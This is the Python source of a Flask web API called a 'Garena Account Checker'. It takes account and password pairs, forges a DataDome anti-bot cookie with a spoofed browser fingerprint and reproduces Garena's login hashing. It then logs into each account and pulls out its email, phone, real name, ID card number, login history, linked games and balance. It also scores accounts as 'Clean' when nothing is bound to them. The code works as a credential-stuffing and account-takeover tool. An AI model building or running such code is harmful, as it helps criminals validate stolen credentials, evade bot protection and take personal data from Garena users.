import os
import sys
import time
import random
import hashlib
import json
import urllib.parse
from datetime import datetime
# No ThreadPoolExecutor or threading here, as Flask handles concurrency
from Crypto.Cipher import AES
import requests
# No signal handling, Rich, or Colorama in the API backend
# from rich.console import Console
# from rich.panel import Panel
# from rich.table import Table
# from rich.box import Box, DOUBLE
# from rich.live import Live
# from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn

# --- Flask imports for the API ---
from flask import Flask, request, jsonify

app = Flask(__name__)

# --- Basic logging for the API ---
# We'll use Python's standard logging, not Rich/Colorama here
import logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
api_logger = logging.getLogger(__name__)

# Suppress urllib3 and requests warnings
logging.getLogger("urllib3").setLevel(logging.WARNING)
logging.getLogger("requests").setLevel(logging.WARNING)


# --- Your existing classes and functions, adapted for the API ---

# Colors class is not needed in the API backend as it doesn't print colored output
# ColoredFormatter is not needed either

class CookieManager:
    def __init__(self):
        # In an API context, banned_cookies and fresh_cookies might need
        # a more persistent storage (database, Redis) if shared across requests.
        # For a simple per-request check, we'll just manage them in memory
        # or not use them if the API is stateless.
        # For this example, we'll assume cookies are passed in or generated per request.
        pass
        
    def load_banned_cookies(self):
        pass # Not loading from file in stateless API
    
    def is_banned(self, cookie):
        return False # API doesn't manage banned cookies directly
    
    def mark_banned(self, cookie):
        pass # API doesn't manage banned cookies directly
    
    def get_valid_cookie(self):
        return None # API doesn't manage valid cookies directly
    
    def save_cookie(self, cookie):
        return False # API doesn't manage cookies directly

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        try:
            key, value = item.split("=")
            cookie_dict[key.strip()] = value.strip()
        except IndexError:
            api_logger.warning(f"Skipping invalid cookie component: {item}")
    session.cookies.update(cookie_dict)
    api_logger.info(f"Applied Cookie")

def get_datadome_cookie(session):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    payload = {
        'jsData': json.dumps({
            "ttst": 76.70000004768372, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536,
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "wbd": False, "dp0": True, "tagpu": 5.738121195951787, "wdif": False, "wdifrm": False,
            "npmtm": False, "br_h": 738, "br_w": 260, "isf": False, "nddc": 1, "rs_h": 864,
            "rs_w": 1536, "rs_cd": 24, "phe": False, "nm": False, "jsf": False, "lg": "en-US",
            "pr ": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": True, "str_ls": True,
            "str_idb": True, "str_odb": False, "plgod": False, "plg": 5, "plgne": True, "plgre": True,
            "plgof": False, "plggt": False, "pltod": False, "hcovdr": False, "hcovdr2": False,
            "plovdr": False, "plovdr2": False, "ftsovdr": False, "ftsovdr2": False, "lb": False,
            "eva": 33, "lo": False, "ts_mtp": 0, "ts_tec": False, "ts_tsa": False, "vnd": "Google Inc.",
            "bid": "NA", "mmt": "application/pdf,text/pdf", "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
            "hdn": False, "awe": False, "geb": False, "dat": False, "med": "defined", "aco": "probably",
            "acots": False, "acmp": "probably", "acmpts": True, "acw": "probably", "acwts": False,
            "acma": "maybe", "acmats": False, "ac3": "", "ac3ts": False, "acf": "probably", "acfts": False,
            "acmp4": "maybe", "acmp4ts": False, "acmp3": "probably", "acmp3ts": False, "acwm": "maybe",
            "acwmts": False, "ocpt": False, "vco": "", "vcots": False, "vch": "probably", "vchts": True,
            "vcw": "probably", "vcwts": True, "vc3": "maybe", "vc3ts": False, "vcmp": "", "vcmpts": False,
            "vcq": "maybe", "vcqts": False, "vc1": "probably", "vc1ts": True, "dvm": 8, "sqt": False,
            "so": "landscape-primary", "bda": False, "wdw": True, "prm": True, "tzp": True, "cvs": True,
            "usb": True, "cap": True, "tbf": False, "lgs": True, "tpd": True
        }),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }
    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())
    retries = 3
    for attempt in range(retries):
        try:
            response = session.post(url, headers=headers, data=data)
            response.raise_for_status()
            response_json = response.json()
            if response_json['status'] == 200 and 'cookie' in response_json:
                cookie_string = response_json['cookie']
                datadome = cookie_string.split(';')[0].split('=')[1]
                api_logger.info(f"DataDome cookie found")
                return datadome
            else:
                api_logger.error(f"DataDome cookie not found in response. Status code: {response_json['status']}")
                api_logger.error(f"Response content: {response.text[:200]}...")
                return None
        except requests.exceptions.RequestException as e:
            api_logger.error(f"Error getting Data Dome cookie: {e}")
            if attempt < retries - 1:
                time.sleep(2)
    return None

def prelogin(session, account, max_retries=3): # Reduced retries for API responsiveness
    url = 'https://sso.garena.com/api/prelogin'
    params = {
        'app_id': '10100',
        'account': account,
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'connection': 'keep-alive',
        'host': 'sso.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0'
    }
    
    for attempt in range(max_retries):
        try:
            response = session.get(url, headers=headers, params=params)
            
            if response.status_code == 403:
                api_logger.warning(f"403 Forbidden for {account} (attempt {attempt + 1}/{max_retries})")
                if attempt < max_retries - 1:
                    time.sleep(1) # Shorter sleep for API
                    continue
                else:
                    api_logger.error(f"Max retries reached for {account}. Giving up.")
                    return None, None, None
            
            response.raise_for_status()
            data = response.json()
            new_datadome = response.cookies.get('datadome')
            
            if 'error' in data:
                api_logger.error(f"Prelogin Account Failed: Login: {account} -> {data['error']}")
                return None, None, new_datadome
                
            api_logger.info(f"Prelogin successful: {account}")
            return data.get('v1'), data.get('v2'), new_datadome
            
        except requests.exceptions.HTTPError as e:
            if e.response.status_code == 403:
                api_logger.warning(f"403 Forbidden for {account} (attempt {attempt + 1}/{max_retries})")
                if attempt < max_retries - 1:
                    time.sleep(1)
                    continue
                else:
                    api_logger.error(f"Max retries reached for {account}. Giving up.")
                    return None, None, None
            else:
                api_logger.error(f"HTTP error in prelogin for {account}: {e}")
                if attempt < max_retries - 1:
                    time.sleep(1)
                    continue
                    
        except Exception as e:
            api_logger.error(f"Error fetching prelogin data for {account}: {e}")
            if attempt < max_retries - 1:
                time.sleep(1)
                continue
                
    return None, None, None

def login(session, account, password, v1, v2, max_retries=3):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100',
        'account': account,
        'password': hashed_password,
        'redirect_uri': 'https://account.garena.com/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    headers = {
        'accept': 'application/json, text/plain, */*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
    }
    
    for attempt in range(max_retries):
        try:
            response = session.get(url, headers=headers, params=params)
            
            if response.status_code == 403:
                api_logger.warning(f"403 Forbidden during login for {account} (attempt {attempt + 1}/{max_retries})")
                if attempt < max_retries - 1:
                    time.sleep(1)
                    continue
            
            response.raise_for_status()
            data = response.json()
            sso_key = response.cookies.get('sso_key')
            
            if 'error' in data:
                api_logger.error(f"Account Check Failed: {data['error']}")
                return None
                
            api_logger.info(f"Logged in: {account}")
            return sso_key
            
        except requests.exceptions.HTTPError as e:
            if e.response.status_code == 403:
                api_logger.warning(f"403 Forbidden during login for {account} (attempt {attempt + 1}/{max_retries})")
                if attempt < max_retries - 1:
                    time.sleep(1)
                    continue
            else:
                api_logger.error(f"HTTP error in login for {account}: {e}")
                if attempt < max_retries - 1:
                    time.sleep(1)
                    continue
                    
        except requests.RequestException as e:
            api_logger.error(f"Account Check Failed: {e}")
            if attempt < max_retries - 1:
                time.sleep(1)
                continue
                
    return None

def get_codm_info(session, account):
    codm_info = {}
    has_codm = False
    
    try:
        random_id = str(int(time.time() * 1000))
        token_url = "https://auth.garena.com/oauth/token/grant"
        token_headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
        }
        token_data = "client_id=100082&response_type=token&redirect_uri=https%3A%2F%2Fauth.codm.garena.com%2Fauth%2Fauth%2Fcallback_n%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F&format=json&id=" + random_id
        
        token_response = session.post(token_url, headers=token_headers, data=token_data)
        token_data = token_response.json()
        access_token = token_data.get("access_token", "")
        
        if not access_token:
            api_logger.warning(f"No CODM access token for {account}")
            return has_codm, codm_info
        
        
        codm_callback_url = f"https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/&access_token={access_token}"
        callback_headers = {
            "authority": "auth.codm.garena.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        callback_response = session.get(codm_callback_url, headers=callback_headers, allow_redirects=False)
        
        
        api_callback_url = f"https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}"
        api_callback_headers = {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "cross-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        api_callback_response = session.get(api_callback_url, headers=api_callback_headers, allow_redirects=False)
        location = api_callback_response.headers.get("Location", "")
        
        if "err=3" in location:
            api_logger.info(f"CODM callback returned err=3 for {account}, no CODM detected")
            return has_codm, codm_info
        elif "token=" in location:
            token = location.split("token=")[-1].split('&')[0]
            
            
            check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/"
            check_headers = {
                "authority": "api-delete-request.codm.garena.co.id",
                "accept": "application/json, text/plain, */*",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "codm-delete-token": token,
                "origin": "https://delete-request.codm.garena.co.id",
                "pragma": "no-cache",
                "referer": "https://delete-request.codm.garena.co.id/",
                "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
            }
            
            check_response = session.get(check_login_url, headers=check_headers)
            check_data = check_response.json()
            
            user_data = check_data.get("user", {})
            if user_data:
                has_codm = True
                codm_level = user_data.get("codm_level", "N/A")
                if codm_level == "N/A" or codm_level == "" or codm_level is None:
                    codm_level = "Unknown"
                
                codm_info = {
                    "codm_nickname": user_data.get("codm_nickname", "N/A"),
                    "codm_level": codm_level,
                    "region": user_data.get("region", "N/A"),
                    "uid": user_data.get("uid", "N/A"),
                    "open_id": user_data.get("open_id", "N/A"),
                    "t_open_id": user_data.get("t_open_id", "N/A")
                }
                api_logger.info(f"CODM detected for {account}: Level {codm_info['codm_level']}")
            
    except Exception as e:
        api_logger.error(f"Error getting CODM info for {account}: {e}")
    
    return has_codm, codm_info

def get_game_connections(session, account):
    
    game_info = []
    valid_regions = {'sg', 'ph', 'my', 'tw', 'th', 'id', 'in', 'vn'}
    
    game_mappings = {
        'tw': {
            "100082": "CODM",
            "100067": "FREE FIRE",
            "100070": "SPEED DRIFTERS",
            "100130": "BLACK CLOVER M",
            "100105": "GARENA UNDAWN",
            "100050": "ROV",
            "100151": "DELTA FORCE",
            "100147": "FAST THRILL",
            "100107": "MOONLIGHT BLADE"
        },
        'th': {
            "100067": "FREEFIRE",
            "100055": "ROV",
            "100082": "CODM",
            "100151": "DELTA FORCE",
            "100105": "GARENA UNDAWN",
            "100130": "BLACK CLOVER M",
            "100070": "SPEED DRIFTERS",
            "32836": "FC ONLINE",
            "100071": "FC ONLINE M",
            "100124": "MOONLIGHT BLADE"
        },
        'vn': {
            "32837": "FC ONLINE",
            "100072": "FC ONLINE M",
            "100054": "ROV",
            "100137": "THE WORLD OF WAR"
        },
        'default': {
            "100082": "CODM",
            "100067": "FREEFIRE",
            "100151": "DELTA FORCE",
            "100105": "GARENA UNDAWN",
            "100057": "AOV",
            "100070": "SPEED DRIFTERS",
            "100130": "BLACK CLOVER M",
            "100055": "ROV"
        }
    }

    try:
        
        token_url = "https://authgop.garena.com/oauth/token/grant"
        token_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        token_data = f"client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}"
        
        token_response = session.post(token_url, headers=token_headers, data=token_data)
        access_token = token_response.json().get("access_token", "")
        
        if not access_token:
            api_logger.warning(f"No access token for {account}")
            return ["No game connections found"]

        
        inspect_url = "https://shop.garena.sg/api/auth/inspect_token"
        inspect_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/json"
        }
        inspect_data = {"token": access_token}
        
        inspect_response = session.post(inspect_url, headers=inspect_headers, json=inspect_data)
        session_key_roles = inspect_response.cookies.get('session_key')
        if not session_key_roles:
            api_logger.warning(f"No session_key in response cookies for {account}")
            return ["No game connections found"]
        
        inspect_data = inspect_response.json()
        uac = inspect_data.get("uac", "ph").lower()
        region = uac if uac in valid_regions else 'ph'
        
        
        if region == 'th' or region == 'in':
            base_domain = "termgame.com"
        elif region == 'id':
            base_domain = "kiosgamer.co.id"
        elif region == 'vn':
            base_domain = "napthe.vn"
        else:
            base_domain = f"shop.garena.{region}"
        
        
        applicable_games = game_mappings.get(region, game_mappings['default'])
        detected_roles = {}
        
        for app_id, game_name in applicable_games.items():
            roles_url = f"https://{base_domain}/api/shop/apps/roles"
            params_roles = {'app_id': app_id}
            headers_roles = {
                'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
                'Accept': "application/json, text/plain, */*",
                'Accept-Language': "en-US,en;q=0.9",
                'Accept-Encoding': "gzip, deflate, br, zstd",
                'Connection': "keep-alive",
                'Referer': f"https://{base_domain}/?app={app_id}",
                'Sec-Fetch-Dest': "empty",
                'Sec-Fetch-Mode': "cors",
                'Sec-Fetch-Site': "same-origin",
                'Cookie': f"session_key={session_key_roles}"
            }
            
            try:
                roles_response = session.get(roles_url, params=params_roles, headers=headers_roles)
                roles_data = roles_response.json()
                
                role = None
                if isinstance(roles_data.get("role"), list) and roles_data["role"]:
                    role = roles_data["role"][0]
                elif app_id in roles_data and isinstance(roles_data[app_id], list) and roles_data[app_id]:
                    role = roles_data[app_id][0].get("role", None)
                
                if role:
                    detected_roles[app_id] = role
                    game_info.append(f"[{region.upper()} - {game_name} - {role}]")
            
            except Exception as e:
                api_logger.warning(f"Error checking game {game_name} for {account}: {e}")
        
        if not game_info:
            game_info.append(f"[{region.upper()} - No Game Detected]")
            
    except Exception as e:
        api_logger.error(f"Error getting game connections for {account}: {e}")
        game_info.append("[Error fetching game data]")
    
    return game_info

def parse_account_details(data):
    user_info = data.get('user_info', {})
    
    
    mobile_no = user_info.get('mobile_no', 'N/A')
    country_code = user_info.get('country_code', '')
    
    if mobile_no != 'N/A' and mobile_no and country_code:
        formatted_mobile = f"+{country_code}{mobile_no}"
    else:
        formatted_mobile = mobile_no
    
    
    mobile_bound = bool(mobile_no and mobile_no != 'N/A' and mobile_no.strip())
    
    
    email = user_info.get('email', 'N/A')
    email_verified = bool(user_info.get('email_v', 0))
    email_actually_bound = bool(email != 'N/A' and email and email_verified)
    
    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': email,
        'email_verified': email_verified,
        'email_verified_time': user_info.get('email_verified_time', 0),
        'email_verify_available': bool(user_info.get('email_verify_available', False)),
        
        'security': {
            'password_strength': user_info.get('password_s', 'N/A'),
            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
            'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            'facebook_account': user_info.get('fb_account', None),
            'suspicious': bool(user_info.get('suspicious', False))
        },
        
        'personal': {
            'real_name': user_info.get('realname', 'N/A'),
            'id_card': user_info.get('idcard', 'N/A'),
            'id_card_length': user_info.get('idcard_length', 'N/A'),
            'country': user_info.get('acc_country', 'N/A'),
            'country_code': country_code,
            'mobile_no': formatted_mobile,
            'mobile_binding_status': "Bound" if user_info.get('mobile_binding_status', 0) else "Not Bound",
            'mobile_actually_bound': mobile_bound,
            'extra_data': user_info.get('realinfo_extra_data', {})
        },
        
        'profile': {
            'avatar': user_info.get('avatar', 'N/A'),
            'signature': user_info.get('signature', 'N/A'),
            'shell_balance': user_info.get('shell', 0)
        },
        
        'status': {
            'account_status': "Active" if user_info.get('status', 0) == 1 else "Inactive",
            'whitelistable': bool(user_info.get('whitelistable', False)),
            'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))
        },
        
        'binds': [],
        'game_info': []
    }

    
    if email_actually_bound:
        account_info['binds'].append('Email')
    
    
    if account_info['personal']['mobile_actually_bound']:
        account_info['binds'].append('Phone')
    
    
    if account_info['security']['facebook_connected']:
        account_info['binds'].append('Facebook')
    
    
    if account_info['personal']['id_card'] != 'N/A' and account_info['personal']['id_card']:
        account_info['binds'].append('ID Card')

    account_info['bind_status'] = "Clean" if not account_info['binds'] else f"Bound ({', '.join(account_info['binds'])})"
    account_info['is_clean'] = len(account_info['binds']) == 0

    security_indicators = []
    if account_info['security']['two_step_verify']:
        security_indicators.append("2FA")
    if account_info['security']['authenticator_app']:
        security_indicators.append("Auth App")
    if account_info['security']['suspicious']:
        security_indicators.append("⚠️ Suspicious")
    
    account_info['security_status'] = "✅ Normal" if not security_indicators else " | ".join(security_indicators)

    return account_info

# format_codm_info and format_game_info are for local display, not needed in API response
# format_success_output is for local display, not needed in API response

def process_single_account(account, password):
    """Processes a single account and returns a dictionary result."""
    session = requests.Session()
    session.verify = False
    requests.packages.urllib3.disable_warnings()
    
    # CookieManager is simplified for API context
    cookie_manager = CookieManager() 
    
    # DataDome cookie generation
    datadome = get_datadome_cookie(session)
    if not datadome:
        return {"status": "error", "message": "DataDome cookie generation failed"}
    session.cookies.set('datadome', datadome)
    
    # Prelogin
    v1, v2, new_datadome = prelogin(session, account)
    if not v1 or not v2:
        return {"status": "error", "message": "Prelogin failed"}
    if new_datadome:
        session.cookies.set('datadome', new_datadome)
    
    # Login
    sso_key = login(session, account, password, v1, v2)
    if not sso_key:
        return {"status": "error", "message": "Login failed"}
    session.cookies.set('sso_key', sso_key)
    
    headers = {
        'accept': '*/*',
        'cookie': f'sso_key={sso_key}',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
    }
    
    # Account Init
    init_url = "https://account.garena.com/api/account/init"
    try:
        init_response = session.get(init_url, headers=headers)
        init_response.raise_for_status() # Raise HTTPError for bad responses
        account_data = init_response.json()
    except requests.exceptions.HTTPError as e:
        if e.response.status_code == 403:
            api_logger.warning(f"403 Forbidden during account init for {account}")
            return {"status": "error", "message": "Account Banned or Forbidden"}
        api_logger.error(f"HTTP error during account init for {account}: {e}")
        return {"status": "error", "message": f"Error during account init: {e}"}
    except Exception as e:
        api_logger.error(f"Error during account init for {account}: {e}")
        return {"status": "error", "message": f"Error during account init: {e}"}

    if 'error' in account_data:
        return {"status": "error", "message": f"Error fetching details: {account_data['error']}"}
    
    details = parse_account_details(account_data)
    details['login_history'] = account_data.get("login_history", [])
    
    # CODM Info
    has_codm, codm_info = get_codm_info(session, account)
    details['has_codm'] = has_codm
    details['codm_info'] = codm_info
    
    # Game Connections
    game_info = get_game_connections(session, account)
    details['game_info'] = game_info
    
    session.close() # Close session after use
    
    return {"status": "success", "account_details": details}


# --- Flask API Endpoint ---
@app.route('/check_account', methods=['POST'])
def check_account_endpoint():
    data = request.get_json()
    if not data or 'account' not in data or 'password' not in data:
        return jsonify({"error": "Missing 'account' or 'password' in request body"}), 400

    account = data['account']
    password = data['password']

    api_logger.info(f"Received request to check account: {account}")
    result = process_single_account(account, password)
    api_logger.info(f"Finished checking account: {account} with status: {result.get('status')}")
    
    return jsonify(result)

@app.route('/')
def index():
    return "Garena Account Checker API is running. Send POST requests to /check_account."

if __name__ == '__main__':
    # Render will set the PORT environment variable
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
